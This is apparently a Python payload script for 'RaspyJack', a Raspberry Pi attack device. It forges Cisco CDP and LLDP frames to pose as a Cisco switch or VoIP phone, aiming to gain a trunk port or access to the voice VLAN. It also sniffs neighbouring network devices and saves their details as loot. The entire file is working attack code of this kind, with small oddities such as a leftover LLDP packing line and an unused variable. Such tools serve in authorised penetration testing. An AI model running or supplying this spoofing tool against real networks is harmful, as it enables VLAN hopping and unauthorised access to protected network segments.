#!/usr/bin/env python3
"""
RaspyJack Payload -- CDP/LLDP Spoof
====================================
Author: 7h30th3r0n3

CDP/LLDP spoofing to impersonate a Cisco switch or VoIP phone.
Craft CDP frames using scapy (Dot3/LLC/SNAP + CDP payload) or raw
Ethernet.  Sniffs existing CDP/LLDP to learn the environment first.

Modes:
  Switch   -- Advertise as Cisco switch to get trunk port
  VoIP     -- Advertise as VoIP phone to get voice VLAN
  Custom   -- User-defined device ID and capabilities

Controls:
  OK         -- Start / Stop spoofing
  KEY1       -- Cycle mode (Switch / VoIP / Custom)
  UP / DOWN  -- Scroll discovered neighbors
  KEY2       -- Export neighbor table
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/CDPSpoof/
"""

import os
import sys
import time
import json
import struct
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        Ether, Dot3, LLC, SNAP, Raw, IP, UDP,
        sendp, sniff as scapy_sniff, get_if_hwaddr, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/CDPSpoof"
os.makedirs(LOOT_DIR, exist_ok=True)

CDP_MULTICAST = "01:00:0c:cc:cc:cc"
LLDP_MULTICAST = "01:80:c2:00:00:0e"
LLDP_ETHERTYPE = 0x88CC
CDP_INTERVAL = 30
ROWS_VISIBLE = 5

MODES = ["Switch", "VoIP", "Custom"]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
spoofing = False
mode_idx = 0
frames_sent = 0
neighbors = []       # list of dicts: name, model, ip, port, vlan, source
scroll_pos = 0
status_msg = "Ready"
my_iface = "eth0"
my_mac = ""

_spoof_thread = None
_listen_thread = None

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _get_default_iface():
    """Get the interface with the default route."""
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


def _get_iface_mac(iface):
    """Read MAC of our interface."""
    try:
        with open(f"/sys/class/net/{iface}/address") as fh:
            return fh.read().strip()
    except Exception:
        return "00:00:00:00:00:00"


def _get_iface_ip(iface):
    """Read IPv4 address of our interface."""
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", "dev", iface],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return "0.0.0.0"


# ---------------------------------------------------------------------------
# CDP frame building
# ---------------------------------------------------------------------------

def _build_cdp_tlv(tlv_type, value_bytes):
    """Build a single CDP TLV: type(2) + length(2) + value."""
    length = 4 + len(value_bytes)
    return struct.pack("!HH", tlv_type, length) + value_bytes


def _cdp_checksum(data):
    """Compute CDP checksum (standard IP-style)."""
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return (~total) & 0xFFFF


def _build_cdp_frame(iface, mac, mode):
    """Build a complete CDP frame for the given mode."""
    ip_addr = _get_iface_ip(iface)
    ip_bytes = bytes(int(x) for x in ip_addr.split("."))

    if mode == "Switch":
        device_id = b"RJ-SW-3750X"
        platform = b"cisco WS-C3750X-48P"
        capabilities = struct.pack("!I", 0x00000029)  # Switch + Bridge
        port_id = b"GigabitEthernet0/1"
        software = b"Cisco IOS 15.2(4)E, RELEASE SOFTWARE"
    elif mode == "VoIP":
        device_id = b"SEP" + mac.replace(":", "").upper().encode()
        platform = b"Cisco IP Phone 8841"
        capabilities = struct.pack("!I", 0x00000090)  # Phone + Host
        port_id = b"Port 1"
        software = b"SIP88xx.12-5-1SR3-1"
    else:
        device_id = b"RJ-CUSTOM-01"
        platform = b"Linux Embedded"
        capabilities = struct.pack("!I", 0x00000001)  # Router
        port_id = b"eth0"
        software = b"RaspyJack Custom Agent"

    # Address TLV: count(4) + proto_type(1) + proto_len(1) + proto(1) + addr_len(2) + addr(4)
    addr_entry = struct.pack("!IBBB", 1, 1, 1, 0xCC) + struct.pack("!H", 4) + ip_bytes

    tlvs = b""
    tlvs += _build_cdp_tlv(0x0001, device_id)        # Device-ID
    tlvs += _build_cdp_tlv(0x0002, addr_entry)        # Addresses
    tlvs += _build_cdp_tlv(0x0003, port_id)           # Port-ID
    tlvs += _build_cdp_tlv(0x0004, capabilities)      # Capabilities
    tlvs += _build_cdp_tlv(0x0005, software)          # Software Version
    tlvs += _build_cdp_tlv(0x0006, platform)          # Platform
    if mode == "VoIP":
        # Appliance VLAN-ID for voice VLAN discovery
        tlvs += _build_cdp_tlv(0x000E, struct.pack("!BH", 1, 100))

    # CDP header: version(1) + ttl(1) + checksum(2)
    cdp_header = struct.pack("!BBH", 2, 180, 0)
    cdp_payload = cdp_header + tlvs
    # Patch checksum
    chk = _cdp_checksum(cdp_payload)
    cdp_payload = cdp_payload[:2] + struct.pack("!H", chk) + cdp_payload[4:]

    # Dot3/LLC/SNAP encapsulation
    frame = (
        Dot3(dst=CDP_MULTICAST, src=mac, len=len(cdp_payload) + 8)
        / LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03)
        / SNAP(OUI=0x00000C, code=0x2000)
        / Raw(load=cdp_payload)
    )
    return frame


# ---------------------------------------------------------------------------
# LLDP frame building (for Custom mode secondary)
# ---------------------------------------------------------------------------

def _build_lldp_frame(iface, mac, device_name):
    """Build a minimal LLDP frame."""
    mac_bytes = bytes.fromhex(mac.replace(":", ""))

    tlvs = b""
    # Chassis ID (subtype 4 = MAC)
    chassis = struct.pack("!B", 4) + mac_bytes
    tlvs += struct.pack("!HH", (1 << 9) | len(chassis), 0)[:2]
    # Simplified: pack as TLV type|length in 2 bytes
    tl = (1 << 9) | (len(chassis) & 0x01FF)
    tlvs = struct.pack("!H", tl) + chassis

    # Port ID (subtype 7 = local)
    port = struct.pack("!B", 7) + iface.encode()
    tl = (2 << 9) | (len(port) & 0x01FF)
    tlvs += struct.pack("!H", tl) + port

    # TTL
    ttl_val = struct.pack("!H", 120)
    tl = (3 << 9) | (len(ttl_val) & 0x01FF)
    tlvs += struct.pack("!H", tl) + ttl_val

    # System Name
    name_bytes = device_name.encode()
    tl = (5 << 9) | (len(name_bytes) & 0x01FF)
    tlvs += struct.pack("!H", tl) + name_bytes

    # End of LLDPDU
    tlvs += struct.pack("!H", 0)

    frame = Ether(dst=LLDP_MULTICAST, src=mac, type=LLDP_ETHERTYPE) / Raw(load=tlvs)
    return frame


# ---------------------------------------------------------------------------
# CDP/LLDP listener
# ---------------------------------------------------------------------------

def _parse_cdp_tlvs(data):
    """Parse CDP TLVs from raw bytes (after CDP header)."""
    info = {}
    offset = 0
    while offset + 4 <= len(data):
        tlv_type, tlv_len = struct.unpack("!HH", data[offset:offset + 4])
        if tlv_len < 4:
            break
        value = data[offset + 4:offset + tlv_len]
        if tlv_type == 0x0001:
            info["name"] = value.decode("utf-8", errors="replace")
        elif tlv_type == 0x0003:
            info["port"] = value.decode("utf-8", errors="replace")
        elif tlv_type == 0x0005:
            info["firmware"] = value.decode("utf-8", errors="replace")[:60]
        elif tlv_type == 0x0006:
            info["model"] = value.decode("utf-8", errors="replace")
        elif tlv_type == 0x0002:
            # Address TLV: try to extract first IPv4
            try:
                if len(value) >= 13:
                    ip_bytes = value[9:13]
                    info["ip"] = ".".join(str(b) for b in ip_bytes)
            except Exception:
                pass
        offset += tlv_len
    return info


def _parse_lldp_tlvs(data):
    """Parse LLDP TLVs from raw bytes."""
    info = {}
    offset = 0
    while offset + 2 <= len(data):
        header = struct.unpack("!H", data[offset:offset + 2])[0]
        tlv_type = (header >> 9) & 0x7F
        tlv_len = header & 0x01FF
        offset += 2
        if tlv_type == 0:
            break
        value = data[offset:offset + tlv_len]
        if tlv_type == 1 and len(value) > 1:
            # Chassis ID
            subtype = value[0]
            if subtype == 4 and len(value) >= 7:
                info["mac"] = ":".join(f"{b:02x}" for b in value[1:7])
        elif tlv_type == 5:
            info["name"] = value.decode("utf-8", errors="replace")
        elif tlv_type == 6:
            info["model"] = value.decode("utf-8", errors="replace")[:40]
        elif tlv_type == 8:
            # Management Address
            try:
                if len(value) >= 6 and value[1] == 1:
                    info["ip"] = ".".join(str(b) for b in value[2:6])
            except Exception:
                pass
        offset += tlv_len
    return info


def _listener_loop():
    """Sniff CDP and LLDP frames and populate neighbor table."""
    def _process_pkt(pkt):
        if not running:
            return
        raw_bytes = bytes(pkt)
        info = {}

        # Check for CDP (Dot3 + LLC + SNAP to 01:00:0c:cc:cc:cc)
        if pkt.haslayer(LLC) and pkt.haslayer(SNAP):
            snap_layer = pkt.getlayer(SNAP)
            if snap_layer and snap_layer.code == 0x2000:
                payload = bytes(pkt.getlayer(Raw).load) if pkt.haslayer(Raw) else b""
                if len(payload) > 4:
                    info = _parse_cdp_tlvs(payload[4:])
                    info["source"] = "CDP"

        # Check for LLDP (EtherType 0x88cc)
        elif pkt.haslayer(Ether) and pkt[Ether].type == LLDP_ETHERTYPE:
            payload = bytes(pkt.getlayer(Raw).load) if pkt.haslayer(Raw) else b""
            if payload:
                info = _parse_lldp_tlvs(payload)
                info["source"] = "LLDP"

        if info.get("name") or info.get("model"):
            info.setdefault("name", "Unknown")
            info.setdefault("model", "")
            info.setdefault("ip", "")
            info.setdefault("port", "")
            info.setdefault("firmware", "")
            info.setdefault("vlan", "")
            info["last_seen"] = datetime.now().strftime("%H:%M:%S")
            with lock:
                # Update existing or add new
                existing = None
                for n in neighbors:
                    if n.get("name") == info["name"] and n.get("source") == info.get("source"):
                        existing = n
                        break
                if existing is not None:
                    idx = neighbors.index(existing)
                    updated = dict(existing)
                    updated.update(info)
                    neighbors[idx] = updated
                else:
                    neighbors.append(dict(info))

    try:
        scapy_sniff(
            iface=my_iface,
            filter="ether dst 01:00:0c:cc:cc:cc or ether proto 0x88cc",
            prn=_process_pkt,
            store=False,
            stop_filter=lambda _: not running,
            timeout=0,
        )
    except Exception:
        # Fallback: sniff without BPF filter
        try:
            scapy_sniff(
                iface=my_iface,
                prn=_process_pkt,
                store=False,
                stop_filter=lambda _: not running,
            )
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Spoofing thread
# ---------------------------------------------------------------------------

def _spoof_loop():
    """Periodically send CDP/LLDP frames."""
    global frames_sent
    while running and spoofing:
        mode = MODES[mode_idx]
        try:
            cdp_frame = _build_cdp_frame(my_iface, my_mac, mode)
            sendp(cdp_frame, iface=my_iface, verbose=False)
            with lock:
                frames_sent += 1

            if mode == "Custom":
                lldp_frame = _build_lldp_frame(my_iface, my_mac, "RJ-CUSTOM-01")
                sendp(lldp_frame, iface=my_iface, verbose=False)
                with lock:
                    frames_sent += 1
        except Exception:
            pass

        # Sleep in small increments so we can exit quickly
        for _ in range(CDP_INTERVAL * 10):
            if not running or not spoofing:
                break
            time.sleep(0.1)


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_neighbors():
    """Export neighbor table to loot."""
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "mode": MODES[mode_idx],
            "frames_sent": frames_sent,
            "neighbors": [dict(n) for n in neighbors],
        }
        st = "status_msg"
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"cdp_spoof_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            global status_msg
            status_msg = "Exported to loot"
    except Exception as exc:
        with lock:
            status_msg = f"Export err: {exc}"


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render current state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "CDP/LLDP SPOOF", fill="CYAN", font=font)

    with lock:
        st = status_msg
        mode = MODES[mode_idx]
        fs = frames_sent
        sp = scroll_pos
        nbr_list = list(neighbors)
        spf = spoofing

    color_mode = "GREEN" if spf else "YELLOW"
    draw.text((2, 14), f"Mode: {mode}", fill=color_mode, font=font)
    draw.text((2, 26), f"Sent: {fs}  Nbrs: {len(nbr_list)}", fill="WHITE", font=font)
    draw.text((2, 38), st[:22], fill="GRAY", font=font)

    # Neighbor list
    y = 52
    visible = nbr_list[sp:sp + ROWS_VISIBLE]
    for n in visible:
        src_tag = f"[{n.get('source', '?')[0]}]"
        line = f"{src_tag} {n.get('name', '?')[:16]}"
        draw.text((2, y), line, fill="WHITE", font=font)
        y += 14

    if not visible:
        draw.text((2, 52), "No neighbors yet", fill="GRAY", font=font)

    # Footer
    if spf:
        draw.text((2, 116), "OK:Stop K1:Mode K3:Quit", fill="GRAY", font=font)
    else:
        draw.text((2, 116), "OK:Start K1:Mode K3:Quit", fill="GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, spoofing, mode_idx, scroll_pos, status_msg
    global my_iface, my_mac, _spoof_thread, _listen_thread

    try:
        if not SCAPY_OK:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((4, 50), "scapy not found!", font=font, fill="RED")
            draw.text((4, 65), "pip install scapy", font=font, fill="GRAY")
            LCD.LCD_ShowImage(img, 0, 0)
            time.sleep(3)
            GPIO.cleanup()
            return 1

        my_iface = _get_default_iface()
        my_mac = _get_iface_mac(my_iface)

        with lock:
            status_msg = f"Iface: {my_iface}"

        # Start passive listener
        _listen_thread = threading.Thread(target=_listener_loop, daemon=True)
        _listen_thread.start()

        _draw_screen()

        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                running = False
                break

            elif btn == "OK":
                with lock:
                    spoofing = not spoofing
                if spoofing:
                    with lock:
                        status_msg = "Spoofing active"
                    _spoof_thread = threading.Thread(target=_spoof_loop, daemon=True)
                    _spoof_thread.start()
                else:
                    with lock:
                        status_msg = "Spoofing stopped"
                time.sleep(0.3)

            elif btn == "KEY1":
                with lock:
                    mode_idx = (mode_idx + 1) % len(MODES)
                    status_msg = f"Mode: {MODES[mode_idx]}"
                time.sleep(0.3)

            elif btn == "UP":
                with lock:
                    if scroll_pos > 0:
                        scroll_pos -= 1

            elif btn == "DOWN":
                with lock:
                    max_s = max(0, len(neighbors) - ROWS_VISIBLE)
                    if scroll_pos < max_s:
                        scroll_pos += 1

            elif btn == "KEY2":
                threading.Thread(target=_export_neighbors, daemon=True).start()
                time.sleep(0.3)

            _draw_screen()
            time.sleep(0.15)

    finally:
        running = False
        spoofing = False

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((10, 50), "CDP Spoof stopped", fill="YELLOW", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
